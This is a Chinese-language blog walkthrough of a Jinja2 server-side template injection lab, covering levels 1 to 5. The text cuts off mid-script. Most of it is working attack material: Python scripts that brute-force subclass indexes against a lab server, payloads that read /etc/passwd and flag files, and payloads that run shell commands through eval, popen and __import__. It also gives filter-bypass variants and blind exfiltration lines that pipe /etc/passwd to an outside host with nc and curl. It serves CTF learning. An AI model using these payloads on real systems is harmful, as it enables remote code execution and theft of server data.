<p>可通过角标查看<img src="/2023/02/09/ssti/image-20230730215805610.png"></p>
<p>，在python2中，子类file类可直接用于读取文件：</p>
<p>编写脚本寻找file类对应角标：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5001/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    r = html.unescape(r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-comment">#这里假设寻找到file类位于50位</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="hljs-number">50</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>但是现在基本上都用py3，包括我的靶场，所以有另外一种读文件方式，我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。微调脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5001/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    r = html.unescape(r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;FileLoader&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-comment">#这里寻找到file类位于79下标</span><br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230730225207888.png"></p>
<p><code>get_data</code>方法读文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">79</span>][<span class="hljs-string">&quot;get_data&quot;</span>](<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230730233526240.png"></p>
<p>玩点更有意思的，getshell</p>
<p>内建函数：</p>
<p>在python解释器启动时，即使没有创建任何变量或函数，无需导入任何模块，有很多函数可以使用，叫做内建函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#以下是 Python 3.x 版本中的所有内置函数的列表：</span><br><br><span class="hljs-built_in">abs</span>()<br><span class="hljs-built_in">all</span>()<br><span class="hljs-built_in">any</span>()<br><span class="hljs-built_in">ascii</span>()<br><span class="hljs-built_in">bin</span>()<br><span class="hljs-built_in">bool</span>()<br><span class="hljs-built_in">breakpoint</span>()<br><span class="hljs-built_in">bytearray</span>()<br><span class="hljs-built_in">bytes</span>()<br><span class="hljs-built_in">callable</span>()<br><span class="hljs-built_in">chr</span>()<br><span class="hljs-built_in">classmethod</span>()<br><span class="hljs-built_in">compile</span>()<br><span class="hljs-built_in">complex</span>()<br><span class="hljs-built_in">delattr</span>()<br><span class="hljs-built_in">dict</span>()<br><span class="hljs-built_in">dir</span>()<br><span class="hljs-built_in">divmod</span>()<br><span class="hljs-built_in">enumerate</span>()<br><span class="hljs-built_in">eval</span>()<span class="hljs-comment">####this</span><br><span class="hljs-built_in">exec</span>()<span class="hljs-comment">####and this</span><br><span class="hljs-comment">#上面两个能够执行任意python代码，当然也就能导入os库，调用系统命令</span><br><span class="hljs-built_in">filter</span>()<br><span class="hljs-built_in">float</span>()<br><span class="hljs-built_in">format</span>()<br><span class="hljs-built_in">frozenset</span>()<br><span class="hljs-built_in">getattr</span>()<br><span class="hljs-built_in">globals</span>()<br><span class="hljs-built_in">hasattr</span>()<br><span class="hljs-built_in">hash</span>()<br><span class="hljs-built_in">help</span>()<br><span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">id</span>()<br><span class="hljs-built_in">input</span>()<br><span class="hljs-built_in">int</span>()<br><span class="hljs-built_in">isinstance</span>()<br><span class="hljs-built_in">issubclass</span>()<br><span class="hljs-built_in">iter</span>()<br><span class="hljs-built_in">len</span>()<br><span class="hljs-built_in">list</span>()<br><span class="hljs-built_in">locals</span>()<br><span class="hljs-built_in">map</span>()<br><span class="hljs-built_in">max</span>()<br><span class="hljs-built_in">memoryview</span>()<br><span class="hljs-built_in">min</span>()<br><span class="hljs-built_in">next</span>()<br><span class="hljs-built_in">object</span>()<br><span class="hljs-built_in">oct</span>()<br><span class="hljs-built_in">open</span>()<br><span class="hljs-built_in">ord</span>()<br><span class="hljs-built_in">pow</span>()<br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">property</span>()<br><span class="hljs-built_in">range</span>()<br><span class="hljs-built_in">repr</span>()<br><span class="hljs-built_in">reversed</span>()<br><span class="hljs-built_in">round</span>()<br><span class="hljs-built_in">set</span>()<br><span class="hljs-built_in">setattr</span>()<br><span class="hljs-built_in">slice</span>()<br><span class="hljs-built_in">sorted</span>()<br><span class="hljs-built_in">staticmethod</span>()<br><span class="hljs-built_in">str</span>()<br><span class="hljs-built_in">sum</span>()<br><span class="hljs-built_in">super</span>()<br><span class="hljs-built_in">tuple</span>()<br><span class="hljs-built_in">type</span>()<br><span class="hljs-built_in">vars</span>()<br><span class="hljs-built_in">zip</span>()<br><span class="hljs-keyword">import</span>()<br></code></pre></td></tr></table></figure>

<p><code>__builtins__</code>：在python中，<code>__builtins__</code>是一个特殊模块，它包含了python内置的所有函数、异常对象。以一个集合的形式查看其引用，<code>__builtins__</code> 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。</p>
<p><code>__globals__</code> 是一个函数对象特有的属性，它是一个字典，记录了该函数所在文件中的全局变量的值。当函数被定义时，它会捕获所在文件的全局命名空间（global namespace），包括所有的全局变量。这些全局变量的值会被保存在 <code>__globals__</code> 属性所指向的字典中。在 Python 中，每个函数都有一个 <code>__globals__</code> 属性，它指向一个字典，包含函数所在文件的全局变量。这使得函数可以在执行时访问其所在文件的全局变量，即使它们定义在函数之外。</p>
<p><code>__import__()</code>：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 <code>__import__()</code> 来动态载入，就是 <code>import</code>。语法：<code>__import__(模块名)</code></p>
<p><code>__init__</code>：构造函数，实例化类时自动调用</p>
<p>有要注意的点：</p>
<p>从上面的内建函数列表可以找到eval和exec这俩函数，</p>
<p>写脚本找有这俩函数的子类：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5003/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s].__init__.__globals__.__builtins__&#125;&#125;&quot;&quot;&quot;</span>%i<br>    evalClass = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    evalclass_r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:evalClass&#125;).text<br>    r = html.unescape(r)<br>    evalclass_r = html.unescape(evalclass_r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;eval&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(evalclass_r)<br>        <br></code></pre></td></tr></table></figure>

<p>这里符合条件的子类也是相当多</p>
<p><img src="/2023/02/09/ssti/image-20230731005556778.png"></p>
<p>相当多，我们随便取个数继续构造payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">399</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>后面发现不一定要使用<code>__builtins__</code>模块，还可以试试别的模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># __builtins__</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment"># popen</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment"># os</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">213</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230731012232999.png"></p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>被警告了</p>
<p><img src="/2023/02/09/ssti/image-20230731021637628.png"></p>
<p>这样又没事</p>
<p><img src="/2023/02/09/ssti/image-20230731021730919.png"></p>
<p>这样也可</p>
<p><img src="/2023/02/09/ssti/image-20230731021752614.png"></p>
<p>左双括号被ban了</p>
<p><img src="/2023/02/09/ssti/image-20230731021832024.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% ... %&#125; for Statements <br><br>&#123;&#123; ... &#125;&#125; for Expressions to print to the template output<br><br>&#123;# ... #&#125; for Comments not included in the template output<br><br>#  ... # for Line Statements<br></code></pre></td></tr></table></figure>

<p>jinja2模板语法中可不止<code>&#123;&#123;&#125;&#125;</code>，还有<code>&#123;%%&#125;</code>，用于插入逻辑控制代码，<em><strong>其中的代码会在渲染模板时被执行</strong></em>，</p>
<p>在 Jinja2 模板引擎中，<code>&#123;%%&#125;</code> 中的控制结构包括以下几种，和解题没关系的也顺便加下，多学百益无一害：</p>
<ol>
<li><code>&#123;% if ... %&#125;` 和 `&#123;% endif %&#125;</code>：条件语句，用于根据条件执行不同的代码块。</li>
<li><code>&#123;% for ... %&#125;` 和 `&#123;% endfor %&#125;</code>：循环语句，用于遍历一个可迭代对象的元素。</li>
<li><code>&#123;% while ... %&#125;` 和 `&#123;% endwhile %&#125;</code>：循环语句，用于根据条件循环执行代码块。</li>
<li><code>&#123;% else %&#125;</code>：与 if 或 for 配合使用，在没有满足条件或循环结束时执行的代码块。</li>
<li><code>&#123;% elif ... %&#125;</code>：与 if 配合使用，用于添加额外的条件分支。</li>
<li><code>&#123;% set ... %&#125;</code>：变量赋值语句，用于在模板中定义变量。</li>
<li><code>&#123;% macro ... %&#125;` 和 `&#123;% endmacro %&#125;</code>：宏定义，用于在模板中定义可复用的代码片段。</li>
<li><code>&#123;% call ... %&#125;` 和 `&#123;% endcall %&#125;</code>：调用宏，用于调用已定义的宏。</li>
<li><code>&#123;% block ... %&#125;` 和 `&#123;% endblock %&#125;</code>：块定义，用于在模板继承中重写内容。</li>
<li><code>&#123;% extends ... %&#125;</code>：模板继承，用于继承其他模板，并重写其中的块内容。</li>
<li><code>&#123;%include ... %&#125;</code>：引入外部模板</li>
</ol>
<p>陌生的那些用一个例子说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;&#123;&#123; title &#125;&#125;&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &#123;% if user %&#125;<br>        &lt;h1&gt;Hello, &#123;&#123; user &#125;&#125;!&lt;/h1&gt;<br>    &#123;% else %&#125;<br>        &lt;h1&gt;Hello, Guest!&lt;/h1&gt;<br>    &#123;% endif %&#125;<br><br>    &#123;% macro format_name(first, last) %&#125;<br>        &#123;&#123; first &#125;&#125; &#123;&#123; last &#125;&#125;<br>    &#123;% endmacro %&#125;<br><br>    &lt;p&gt;Full Name: &#123;&#123; format_name(&#x27;John&#x27;, &#x27;Doe&#x27;) &#125;&#125;&lt;/p&gt;<br>    <br>    &#123;% macro greet(name) %&#125;<br>    	&lt;h1&gt;Hello,&#123;&#123;name&#125;&#125;!&lt;/h1&gt;<br>    &#123;%endmacro%&#125;<br>    <br>    &#123;% call greet(&#x27;Jhon&#x27;) %&#125;<br>    &#123;% call greet(&#x27;Alice&#x27;) %&#125;<br><br>    &#123;% block content %&#125;<br>        &lt;p&gt;This is the default content.&lt;/p&gt;<br>    &#123;% endblock %&#125;<br><br>    &#123;% include &#x27;footer.html&#x27; %&#125;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>while，set:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;While Loop Example&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &#123;% set counter = 1 %&#125;<br>    &lt;ul&gt;<br>        &#123;% while counter &lt;= 5 %&#125;<br>            &lt;li&gt;Item &#123;&#123; counter &#125;&#125;&lt;/li&gt;<br>            &#123;% set counter = counter + 1 %&#125;&lt;!--注意这里要用set--&gt;<br>        &#123;% endwhile %&#125;<br>    &lt;/ul&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>最后构造payload，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">/*逻辑语句会执行，但是不输出，因此需要回带到自己vps*/<br>&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;//nc实现回带<br>&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://124.70.99.199:7890/?`cat /etc/passwd`&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;//curl实现回带<br><br><br>&#123;%for i in (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endfor%&#125;//curl实现同上<br><br>/*感觉可能的实现方式都试了一遍，最后发现set也可*/<br>&#123;%set a = (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;<br></code></pre></td></tr></table></figure>

<p>看别人博客时发现print居然也能写进来诶，自己想了想，既然能够执行为啥不能用print呢，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&quot;))%&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230731025126135.png"></p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>emmm，上面出了点小趣事，涉及到jinja2的渲染语句还是都打上代码块吧呜呜（，传博客的时候发现报错</p>
<p><img src="/2023/02/09/ssti/image-20230731024741335.png"></p>
<p>，小问题，都打上代码块就好了</p>
<p>输入1，</p>
<p><img src="/2023/02/09/ssti/image-20230731030014042.png"></p>
<p><img src="/2023/02/09/ssti/image-20230731030026544.png"></p>
<p>只会显示语法正确与否，不会回显，那好办，上一题回带vps的payload直接拿下来用，</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230731025728066.png"></p>
<p>还看到了别人的姿势，</p>
<p><img src="/2023/02/09/ssti/image-20230731030517813.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>

<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>中括号被过滤了，<a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.1.x/templates/#variables">查Jinja官方文档</a>，variable开头就直接说了</p>
<p><img src="/2023/02/09/ssti/image-20230731170423110.png"></p>
<p>你可以使用点（ <code>.</code> ）来访问变量的属性，作为替代，也可以使用所谓的“下标”语 法（<code>[]</code>），如果点被过滤，可以用中括号绕过。</p>
<p>中括号被过滤了呢，这里的代码写出了一种特殊的方法<code>__getitem__</code>，用于获取foo中的item</p>
<p><img src="/2023/02/09/ssti/image-20230731180156155.png">我们可以用<code>__getitem__()</code>来获取字典中的键值，看了别人的博客，知道pop()方法也可以取键值，但是会删除键，不到万不得已不要用</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.__builtins__.__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().pop(399).__init__.__globals__.__builtins__.pop(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.get(&#x27;__builtins__&#x27;).__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125; ##get()返回指定键的值，如果值不在字典中返回default值<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.setdefault(&#x27;__builtins__&#x27;).__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;  ##setdefault(),和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<br></code></pre></td></tr></table></figure>

<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>单双引号被过滤</p>
<p><img src="/2023/02/09/ssti/image-20230731183825048.png"></p>
<p>这个是真不会，去网上找别人的题解</p>
<p>引号过滤有主要两种绕过方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">#方法一：request对象(jinja2)<br>&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).popen(request.args.arg3).read()&#125;&#125;<br>#然后GET传递a，b，c参数用于替代引号内的几样字符串<br>#?a=__import__&amp;b=os&amp;c=cat /etc/passwd<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230801020731807.png"></p>
<p><code>request.values</code>返回无论是GET还是POST请求的参数，当然flak框架内支持<code>request.form</code>用于传递post参数</p>
<p><img src="/2023/02/09/ssti/image-20230801021306517.png"></p>
<p><img src="/2023/02/09/ssti/image-20230801021603150.png"></p>
<p>cookie中传参也可以</p>
<p><img src="/2023/02/09/ssti/image-20230801021808956.png"></p>
<p>举一反三，看到别人的博客cookie可以塞，ua头里是不是也可以塞？去学了下jinja2获取ua头的方式(用法<code>request.user_agent.string</code>获取用户完整的ua字符串，<code>request.user_agent.browser</code>获取浏览器信息，<code>request.user_agent.platform</code>获取操作系统信息)，还真行</p>
<p><img src="/2023/02/09/ssti/image-20230801023029680.png"></p>
<p>那自己创一个请求头也可以喽？还真行，真有意思</p>
<p><img src="/2023/02/09/ssti/image-20230801023528609.png"></p>
<p>第二种方法，chr方法的利用，与python的chr()函数类似，用于将unicode编码转为对应字符，因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他，然后在<code>&#123;%%&#125;</code>中设置变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5003/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(%s).__init__.__globals__.__builtins__&#125;&#125;&quot;&quot;&quot;</span>%i<br>    evalClass = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(%s)&#125;&#125;&quot;&quot;&quot;</span>%i<br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    evalclass_r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:evalClass&#125;).text<br>    r = html.unescape(r)<br>    evalclass_r = html.unescape(evalclass_r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;chr&quot;</span> <span 